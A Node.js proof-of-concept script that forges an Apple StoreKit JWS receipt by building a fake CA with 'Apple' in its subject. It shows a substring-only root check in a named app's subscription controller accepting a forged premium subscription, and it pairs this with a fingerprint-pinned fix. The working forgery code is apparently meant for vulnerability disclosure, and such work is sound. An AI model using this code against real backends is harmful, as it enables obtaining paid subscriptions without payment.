/**
 * PoC: Apple JWS Receipt Verification Bypass
 *
 * Vulnerability: verifyAppleJWS() in src/controllers/subscriptionController.js
 * at line 37 checks `rootCert.subject.includes('Apple')` instead of pinning
 * to Apple's actual root CA fingerprint. An attacker can forge a complete
 * certificate chain with "Apple" in the subject, sign an arbitrary JWS
 * payload, and the verification will accept it as a legitimate Apple receipt.
 *
 * This PoC:
 *   1. Generates a self-signed ECDSA P-256 root CA with "Apple" in the subject
 *   2. Issues a leaf certificate signed by that root CA
 *   3. Constructs a JWS with a forged transaction payload
 *   4. Demonstrates that verifyAppleJWS() accepts it (VULNERABLE)
 *   5. Demonstrates that a hardened version (fingerprint-pinned) rejects it (SECURE)
 *
 * Usage: node poc-apple-jws-bypass.js
 */

'use strict';

const crypto = require('crypto');
const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');

// ============================================================================
// STEP 1: Copy of the VULNERABLE verifyAppleJWS() from
//         src/controllers/subscriptionController.js lines 6-70
// ============================================================================

function verifyAppleJWS_VULNERABLE(jwsRepresentation) {
  const parts = (jwsRepresentation || '').split('.');
  if (parts.length !== 3) throw new Error('Invalid JWS format');

  const [headerB64, payloadB64, signatureB64] = parts;

  const header = JSON.parse(Buffer.from(headerB64, 'base64url').toString('utf8'));
  const payload = JSON.parse(Buffer.from(payloadB64, 'base64url').toString('utf8'));

  if (header.alg !== 'ES256') throw new Error('Unexpected JWS algorithm: ' + header.alg);

  const x5c = header.x5c;
  if (!Array.isArray(x5c) || x5c.length < 2) throw new Error('Missing or invalid x5c chain');

  // Build PEM from each DER certificate in the x5c array
  const toPem = (b64) =>
    '-----BEGIN CERTIFICATE-----\n' +
    b64.match(/.{1,64}/g).join('\n') +
    '\n-----END CERTIFICATE-----';

  // Verify the certificate chain: each cert must be signed by the next one
  for (let i = 0; i < x5c.length - 1; i++) {
    const child = new crypto.X509Certificate(toPem(x5c[i]));
    const issuer = new crypto.X509Certificate(toPem(x5c[i + 1]));
    if (!child.verify(issuer.publicKey)) {
      throw new Error(`Certificate chain broken at index ${i}`);
    }
  }

  // VULNERABLE LINE (line 37 in original): only checks substring match
  const rootCert = new crypto.X509Certificate(toPem(x5c[x5c.length - 1]));
  if (!rootCert.subject.includes('Apple')) {
    throw new Error('Root certificate is not issued by Apple');
  }

  // Verify the JWS signature using the leaf certificate's public key
  const leafCert = new crypto.X509Certificate(toPem(x5c[0]));
  const signedData = `${headerB64}.${payloadB64}`;
  const rawSig = Buffer.from(signatureB64, 'base64url');

  // ES256 JWS signatures are raw R||S (64 bytes); Node crypto needs DER-encoded ECDSA
  if (rawSig.length !== 64) throw new Error('Unexpected signature length');
  const r = rawSig.subarray(0, 32);
  const s = rawSig.subarray(32, 64);
  const rPad = r[0] & 0x80 ? Buffer.concat([Buffer.alloc(1), r]) : r;
  const sPad = s[0] & 0x80 ? Buffer.concat([Buffer.alloc(1), s]) : s;
  const derSig = Buffer.alloc(6 + rPad.length + sPad.length);
  let off = 0;
  derSig[off++] = 0x30;
  derSig[off++] = 4 + rPad.length + sPad.length;
  derSig[off++] = 0x02;
  derSig[off++] = rPad.length;
  rPad.copy(derSig, off); off += rPad.length;
  derSig[off++] = 0x02;
  derSig[off++] = sPad.length;
  sPad.copy(derSig, off);

  const verifier = crypto.createVerify('SHA256');
  verifier.update(signedData);
  if (!verifier.verify(leafCert.publicKey, derSig)) {
    throw new Error('JWS signature verification failed');
  }

  return payload;
}

// ============================================================================
// STEP 2: HARDENED version with fingerprint pinning (for negative PoC)
// ============================================================================

// Apple Root CA - G3 SHA-256 fingerprint (public knowledge, from Apple PKI page)
const APPLE_ROOT_CA_G3_FINGERPRINT =
  '63:34:3A:BF:B8:9A:6A:03:EB:B5:7E:9B:3F:5F:A7:BE:' +
  '7C:4F:BE:10:23:EA:A5:53:91:1E:DF:B7:70:E8:4E:F7';

function verifyAppleJWS_HARDENED(jwsRepresentation) {
  const parts = (jwsRepresentation || '').split('.');
  if (parts.length !== 3) throw new Error('Invalid JWS format');

  const [headerB64, payloadB64, signatureB64] = parts;

  const header = JSON.parse(Buffer.from(headerB64, 'base64url').toString('utf8'));
  const payload = JSON.parse(Buffer.from(payloadB64, 'base64url').toString('utf8'));

  if (header.alg !== 'ES256') throw new Error('Unexpected JWS algorithm: ' + header.alg);

  const x5c = header.x5c;
  if (!Array.isArray(x5c) || x5c.length < 2) throw new Error('Missing or invalid x5c chain');

  const toPem = (b64) =>
    '-----BEGIN CERTIFICATE-----\n' +
    b64.match(/.{1,64}/g).join('\n') +
    '\n-----END CERTIFICATE-----';

  // Verify the certificate chain
  for (let i = 0; i < x5c.length - 1; i++) {
    const child = new crypto.X509Certificate(toPem(x5c[i]));
    const issuer = new crypto.X509Certificate(toPem(x5c[i + 1]));
    if (!child.verify(issuer.publicKey)) {
      throw new Error(`Certificate chain broken at index ${i}`);
    }
  }

  // HARDENED: Pin to Apple's actual root CA fingerprint instead of substring match
  const rootCert = new crypto.X509Certificate(toPem(x5c[x5c.length - 1]));
  const rootFingerprint = rootCert.fingerprint256;
  if (rootFingerprint !== APPLE_ROOT_CA_G3_FINGERPRINT) {
    throw new Error(
      'Root certificate fingerprint does not match Apple Root CA - G3. ' +
      `Got: ${rootFingerprint}`
    );
  }

  // Verify JWS signature
  const leafCert = new crypto.X509Certificate(toPem(x5c[0]));
  const signedData = `${headerB64}.${payloadB64}`;
  const rawSig = Buffer.from(signatureB64, 'base64url');

  if (rawSig.length !== 64) throw new Error('Unexpected signature length');
  const r = rawSig.subarray(0, 32);
  const s = rawSig.subarray(32, 64);
  const rPad = r[0] & 0x80 ? Buffer.concat([Buffer.alloc(1), r]) : r;
  const sPad = s[0] & 0x80 ? Buffer.concat([Buffer.alloc(1), s]) : s;
  const derSig = Buffer.alloc(6 + rPad.length + sPad.length);
  let off = 0;
  derSig[off++] = 0x30;
  derSig[off++] = 4 + rPad.length + sPad.length;
  derSig[off++] = 0x02;
  derSig[off++] = rPad.length;
  rPad.copy(derSig, off); off += rPad.length;
  derSig[off++] = 0x02;
  derSig[off++] = sPad.length;
  sPad.copy(derSig, off);

  const verifier = crypto.createVerify('SHA256');
  verifier.update(signedData);
  if (!verifier.verify(leafCert.publicKey, derSig)) {
    throw new Error('JWS signature verification failed');
  }

  return payload;
}

// ============================================================================
// STEP 3: Certificate and JWS generation helpers
// ============================================================================

function generateCertsAndKey(tmpDir) {
  // --- Generate attacker's fake Root CA (EC P-256) ---
  // Subject contains "Apple" to pass the substring check at line 37
  execSync(
    `openssl ecparam -genkey -name prime256v1 -noout -out "${tmpDir}/root-key.pem"`,
    { stdio: 'pipe' }
  );
  execSync(
    `openssl req -new -x509 -key "${tmpDir}/root-key.pem" ` +
    `-days 3650 -sha256 ` +
    `-subj "/CN=Apple Root CA - G3 Fake/O=Apple Inc. (Attacker)/C=US" ` +
    `-out "${tmpDir}/root-cert.pem"`,
    { stdio: 'pipe' }
  );

  // --- Generate leaf key and CSR ---
  execSync(
    `openssl ecparam -genkey -name prime256v1 -noout -out "${tmpDir}/leaf-key.pem"`,
    { stdio: 'pipe' }
  );
  execSync(
    `openssl req -new -key "${tmpDir}/leaf-key.pem" ` +
    `-subj "/CN=Apple StoreKit Leaf (Attacker)/O=Apple Inc. (Attacker)/C=US" ` +
    `-out "${tmpDir}/leaf-csr.pem"`,
    { stdio: 'pipe' }
  );

  // --- Sign leaf cert with root CA ---
  execSync(
    `openssl x509 -req -in "${tmpDir}/leaf-csr.pem" ` +
    `-CA "${tmpDir}/root-cert.pem" -CAkey "${tmpDir}/root-key.pem" ` +
    `-CAcreateserial -sha256 -days 365 ` +
    `-out "${tmpDir}/leaf-cert.pem"`,
    { stdio: 'pipe' }
  );

  // Read all generated files
  const rootCertPem = fs.readFileSync(`${tmpDir}/root-cert.pem`, 'utf8');
  const leafCertPem = fs.readFileSync(`${tmpDir}/leaf-cert.pem`, 'utf8');
  const leafKeyPem = fs.readFileSync(`${tmpDir}/leaf-key.pem`, 'utf8');

  return { rootCertPem, leafCertPem, leafKeyPem };
}

function pemToBase64Der(pem) {
  // Strip PEM header/footer and newlines to get raw base64 of DER
  return pem
    .replace(/-----BEGIN [A-Z ]+-----/g, '')
    .replace(/-----END [A-Z ]+-----/g, '')
    .replace(/\s+/g, '');
}

function derSignatureToRawRS(derSig) {
  // Parse DER ECDSA signature to extract raw R and S (each 32 bytes, zero-padded)
  let offset = 0;
  if (derSig[offset++] !== 0x30) throw new Error('Expected SEQUENCE');
  offset++; // skip length

  if (derSig[offset++] !== 0x02) throw new Error('Expected INTEGER for R');
  const rLen = derSig[offset++];
  let r = derSig.subarray(offset, offset + rLen);
  offset += rLen;

  if (derSig[offset++] !== 0x02) throw new Error('Expected INTEGER for S');
  const sLen = derSig[offset++];
  let s = derSig.subarray(offset, offset + sLen);

  // Strip leading zero padding (DER integers are signed, may have leading 0x00)
  if (r.length === 33 && r[0] === 0) r = r.subarray(1);
  if (s.length === 33 && s[0] === 0) s = s.subarray(1);

  // Pad to 32 bytes if shorter
  const rBuf = Buffer.alloc(32);
  r.copy(rBuf, 32 - r.length);
  const sBuf = Buffer.alloc(32);
  s.copy(sBuf, 32 - s.length);

  return Buffer.concat([rBuf, sBuf]); // 64 bytes: R || S
}

function buildMaliciousJWS(leafCertB64, rootCertB64, leafKeyPem, payload) {
  // Build header
  const header = {
    alg: 'ES256',
    x5c: [leafCertB64, rootCertB64],
  };

  const headerB64 = Buffer.from(JSON.stringify(header)).toString('base64url');
  const payloadB64 = Buffer.from(JSON.stringify(payload)).toString('base64url');
  const signedData = `${headerB64}.${payloadB64}`;

  // Sign with the leaf private key (ES256 = ECDSA with P-256 + SHA-256)
  const signer = crypto.createSign('SHA256');
  signer.update(signedData);
  const derSig = signer.sign(leafKeyPem);

  // Convert DER ECDSA signature to JWS raw R||S format (64 bytes)
  const rawSig = derSignatureToRawRS(derSig);
  const signatureB64 = rawSig.toString('base64url');

  return `${headerB64}.${payloadB64}.${signatureB64}`;
}

// ============================================================================
// STEP 4: Run the PoC
// ============================================================================

function main() {
  console.log('='.repeat(72));
  console.log('  PoC: Apple JWS Receipt Verification Bypass');
  console.log('  Vulnerability: subscriptionController.js line 37');
  console.log('  Check: rootCert.subject.includes(\'Apple\') -- no fingerprint pinning');
  console.log('='.repeat(72));
  console.log();

  // --- Generate attacker's certificate chain ---
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'poc-apple-jws-'));
  console.log('[*] Generating attacker-controlled ECDSA P-256 certificate chain...');
  console.log(`    Temp directory: ${tmpDir}`);

  const { rootCertPem, leafCertPem, leafKeyPem } = generateCertsAndKey(tmpDir);

  const rootCertB64 = pemToBase64Der(rootCertPem);
  const leafCertB64 = pemToBase64Der(leafCertPem);

  // Print certificate details
  const rootX509 = new crypto.X509Certificate(rootCertPem);
  const leafX509 = new crypto.X509Certificate(leafCertPem);

  console.log();
  console.log('[*] Attacker Root CA:');
  console.log(`    Subject:     ${rootX509.subject}`);
  console.log(`    Issuer:      ${rootX509.issuer}`);
  console.log(`    Fingerprint: ${rootX509.fingerprint256}`);
  console.log();
  console.log('[*] Attacker Leaf Certificate:');
  console.log(`    Subject: ${leafX509.subject}`);
  console.log(`    Issuer:  ${leafX509.issuer}`);
  console.log();

  // --- Craft the forged payload ---
  const forgedPayload = {
    transactionId: 'fake_txn_123',
    productId: 'com.hakanalsancak.ican.premium.yearly',
    originalTransactionId: 'fake_orig_txn_456',
    bundleId: 'com.hakanalsancak.ican',
    type: 'Auto-Renewable Subscription',
    environment: 'Production',
    purchaseDate: Date.now(),
    expiresDate: Date.now() + 365 * 24 * 60 * 60 * 1000,
  };

  console.log('[*] Forged payload:');
  console.log(`    transactionId: ${forgedPayload.transactionId}`);
  console.log(`    productId:     ${forgedPayload.productId}`);
  console.log(`    environment:   ${forgedPayload.environment}`);
  console.log();

  // --- Build the JWS ---
  const maliciousJWS = buildMaliciousJWS(leafCertB64, rootCertB64, leafKeyPem, forgedPayload);

  console.log('[*] Constructed malicious JWS (first 80 chars):');
  console.log(`    ${maliciousJWS.substring(0, 80)}...`);
  console.log();

  // =========================================================================
  // TEST 1: Vulnerable verification (should PASS -- this is the exploit)
  // =========================================================================
  console.log('-'.repeat(72));
  console.log('  TEST 1: Vulnerable verifyAppleJWS() -- subject.includes("Apple")');
  console.log('-'.repeat(72));
  try {
    const result = verifyAppleJWS_VULNERABLE(maliciousJWS);
    console.log();
    console.log('  [VULNERABLE] Verification PASSED with attacker-forged JWS!');
    console.log();
    console.log('  Returned payload:');
    console.log(`    transactionId: ${result.transactionId}`);
    console.log(`    productId:     ${result.productId}`);
    console.log(`    environment:   ${result.environment}`);
    console.log();
    console.log('  Impact: An attacker can forge a premium subscription receipt.');
    console.log('  The backend would write this to the database as a valid active');
    console.log('  subscription, granting premium access without any payment.');
    console.log();
  } catch (err) {
    console.log();
    console.log(`  [OK] Verification correctly REJECTED: ${err.message}`);
    console.log('  (This should NOT happen with the vulnerable code.)');
    console.log();
  }

  // =========================================================================
  // TEST 2: Hardened verification (should FAIL -- negative PoC)
  // =========================================================================
  console.log('-'.repeat(72));
  console.log('  TEST 2: Hardened verifyAppleJWS() -- fingerprint pinning');
  console.log('-'.repeat(72));
  try {
    const result = verifyAppleJWS_HARDENED(maliciousJWS);
    console.log();
    console.log(`  [UNEXPECTED] Verification PASSED! Result: ${JSON.stringify(result)}`);
    console.log('  (This should NOT happen with the hardened code.)');
    console.log();
  } catch (err) {
    console.log();
    console.log('  [SECURE] Verification correctly REJECTED the forged JWS.');
    console.log(`  Error: ${err.message}`);
    console.log();
    console.log('  The hardened version pins to Apple Root CA - G3 fingerprint:');
    console.log(`    Expected: ${APPLE_ROOT_CA_G3_FINGERPRINT}`);
    console.log(`    Got:      ${rootX509.fingerprint256}`);
    console.log();
  }

  // =========================================================================
  // TEST 3: Negative PoC -- non-Apple subject (should fail on both)
  // =========================================================================
  console.log('-'.repeat(72));
  console.log('  TEST 3: Negative PoC -- root cert WITHOUT "Apple" in subject');
  console.log('-'.repeat(72));
  console.log();

  // Generate a root cert without "Apple" in the subject
  execSync(
    `openssl ecparam -genkey -name prime256v1 -noout -out "${tmpDir}/nonapple-root-key.pem"`,
    { stdio: 'pipe' }
  );
  execSync(
    `openssl req -new -x509 -key "${tmpDir}/nonapple-root-key.pem" ` +
    `-days 3650 -sha256 ` +
    `-subj "/CN=Definitely Not That Fruit Company/O=Evil Corp/C=US" ` +
    `-out "${tmpDir}/nonapple-root-cert.pem"`,
    { stdio: 'pipe' }
  );
  execSync(
    `openssl ecparam -genkey -name prime256v1 -noout -out "${tmpDir}/nonapple-leaf-key.pem"`,
    { stdio: 'pipe' }
  );
  execSync(
    `openssl req -new -key "${tmpDir}/nonapple-leaf-key.pem" ` +
    `-subj "/CN=Leaf Cert/O=Evil Corp/C=US" ` +
    `-out "${tmpDir}/nonapple-leaf-csr.pem"`,
    { stdio: 'pipe' }
  );
  execSync(
    `openssl x509 -req -in "${tmpDir}/nonapple-leaf-csr.pem" ` +
    `-CA "${tmpDir}/nonapple-root-cert.pem" -CAkey "${tmpDir}/nonapple-root-key.pem" ` +
    `-CAcreateserial -sha256 -days 365 ` +
    `-out "${tmpDir}/nonapple-leaf-cert.pem"`,
    { stdio: 'pipe' }
  );

  const nonAppleRootPem = fs.readFileSync(`${tmpDir}/nonapple-root-cert.pem`, 'utf8');
  const nonAppleLeafPem = fs.readFileSync(`${tmpDir}/nonapple-leaf-cert.pem`, 'utf8');
  const nonAppleLeafKeyPem = fs.readFileSync(`${tmpDir}/nonapple-leaf-key.pem`, 'utf8');

  const nonAppleJWS = buildMaliciousJWS(
    pemToBase64Der(nonAppleLeafPem),
    pemToBase64Der(nonAppleRootPem),
    nonAppleLeafKeyPem,
    forgedPayload
  );

  try {
    verifyAppleJWS_VULNERABLE(nonAppleJWS);
    console.log('  [UNEXPECTED] Vulnerable version accepted non-Apple cert!');
  } catch (err) {
    console.log('  [EXPECTED] Vulnerable version rejects cert without "Apple" in subject.');
    console.log(`  Error: ${err.message}`);
  }

  console.log();

  try {
    verifyAppleJWS_HARDENED(nonAppleJWS);
    console.log('  [UNEXPECTED] Hardened version accepted non-Apple cert!');
  } catch (err) {
    console.log('  [EXPECTED] Hardened version also rejects cert without Apple fingerprint.');
    console.log(`  Error: ${err.message}`);
  }

  console.log();

  // =========================================================================
  // Summary
  // =========================================================================
  console.log('='.repeat(72));
  console.log('  SUMMARY');
  console.log('='.repeat(72));
  console.log();
  console.log('  The vulnerable check at subscriptionController.js:37');
  console.log();
  console.log('    if (!rootCert.subject.includes(\'Apple\'))');
  console.log();
  console.log('  only verifies that the root certificate\'s subject CONTAINS the');
  console.log('  substring "Apple". An attacker can create their own CA with "Apple"');
  console.log('  in the subject, issue a leaf cert, and sign arbitrary JWS payloads');
  console.log('  that the server will accept as valid Apple StoreKit 2 transactions.');
  console.log();
  console.log('  FIX: Replace the substring check with SHA-256 fingerprint pinning');
  console.log('  against Apple\'s actual Root CA - G3 certificate:');
  console.log();
  console.log('    const APPLE_ROOT_FINGERPRINT = "63:34:3A:BF:B8:9A:...";');
  console.log('    if (rootCert.fingerprint256 !== APPLE_ROOT_FINGERPRINT) {');
  console.log('      throw new Error("Root cert is not Apple Root CA - G3");');
  console.log('    }');
  console.log();

  // Cleanup temp files
  try {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  } catch (_) {
    // best-effort cleanup
  }
}

main();
